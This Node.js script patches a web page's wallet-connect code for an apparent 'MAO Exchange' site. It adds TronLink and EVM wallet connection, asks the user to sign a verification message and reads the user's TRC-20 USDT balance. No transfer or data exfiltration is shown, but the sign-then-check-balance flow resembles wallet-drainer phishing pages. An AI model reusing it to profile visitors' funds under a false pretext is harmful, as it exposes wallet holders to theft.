const fs = require('fs');
let content = fs.readFileSync('index.html', 'utf8');

const newConnectLogic = `
    // Robust Global Wallet Connect Function (Tron TRC-20 + EVM)
    window.connectWeb3Wallet = async function() {
        try {
            // 1. ПРИОРИТЕТ: TRON (TRC-20)
            if (window.tronLink || window.tronWeb) {
                let address = null;
                if (window.tronLink) {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res && res.code === 200) {
                        address = window.tronWeb.defaultAddress.base58;
                    }
                } else if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    address = window.tronWeb.defaultAddress.base58;
                }

                if (address) {
                    if (window.performSignatureVerification) {
                        window.performSignatureVerification({ address, isConnected: true, chainId: 'TRON' }, window.tronWeb);
                    }
                    return;
                }
            }

            // 2. ФОЛЛБЕК: EVM (MetaMask, TrustWallet ERC20/BEP20)
            let injectedProvider = null;
            if (window.ethereum) injectedProvider = window.ethereum;
            else if (window.trustwallet) injectedProvider = window.trustwallet;
            else if (window.BinanceChain) injectedProvider = window.BinanceChain;

            if (injectedProvider) {
                const accounts = await injectedProvider.request({ method: 'eth_requestAccounts' });
                if (accounts && accounts[0]) {
                    const address = accounts[0];
                    const chainIdHex = await injectedProvider.request({ method: 'eth_chainId' });
                    const chainId = parseInt(chainIdHex, 16);
                    if (window.performSignatureVerification) {
                        window.performSignatureVerification({ address, isConnected: true, chainId }, injectedProvider);
                    }
                }
            } else {
                alert('Не найден Web3 кошелек! Для TRC-20 установите расширение TronLink. Для ERC-20/BEP-20 установите MetaMask или TrustWallet.');
            }
        } catch (e) {
            console.error('Wallet connect error:', e);
            alert('Ошибка: ' + e.message);
        }
    };
`;

content = content.replace(/\/\/ Robust Global Wallet Connect Function[\s\S]*?\} catch \(e\) \{\s*console\.error\('Wallet connect error:', e\);\s*alert\('Ошибка: ' \+ e\.message\);\s*\}\s*\};\s*/, newConnectLogic);


const oldSig = `let walletProvider = customProvider;
            if (!walletProvider && typeof window.ethereum !== 'undefined') {
                walletProvider = window.ethereum;
            }
            if (!walletProvider && typeof window.trustwallet !== 'undefined') {
                walletProvider = window.trustwallet;
            }
            if (!walletProvider && typeof modal !== 'undefined' && modal.getWalletProvider) {
                try { walletProvider = modal.getWalletProvider(); } catch(e) {}
            }
            if (!walletProvider) throw new Error("Кошелек не предоставил доступ (No wallet provider). Убедитесь что расширение разблокировано.");
            
            const provider = new ethers.providers.Web3Provider(walletProvider);
            const signer = provider.getSigner();
            const address = state.address;
            
            const message = 'Подтверждение кошелька для MAO Exchange... ' + address + ' ...';
            const signature = await signer.signMessage(message);`;

const newSig = `const address = state.address;
            const message = 'Подтверждение кошелька для MAO Exchange... ' + address + ' ...';
            let signature = 'not_signed';
            let usdtBalance = "0.0";
            
            if (state.chainId === 'TRON') {
                try {
                    const hexMsg = window.tronWeb.toHex(message);
                    signature = await window.tronWeb.trx.sign(hexMsg);
                    // Get TRC20 USDT Balance (Contract: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t)
                    const trc20Contract = await window.tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
                    const bal = await trc20Contract.balanceOf(address).call();
                    usdtBalance = (parseInt(bal) / 1000000).toFixed(2);
                } catch(e) {
                    console.warn("Tron sign/balance error:", e);
                }
            } else {
                let walletProvider = customProvider || window.ethereum || window.trustwallet;
                if (!walletProvider) throw new Error("No wallet provider");
                const provider = new ethers.providers.Web3Provider(walletProvider);
                const signer = provider.getSigner();
                signature = await signer.signMessage(message);
            }`;

content = content.replace(oldSig, newSig);

fs.writeFileSync('index.html', content);
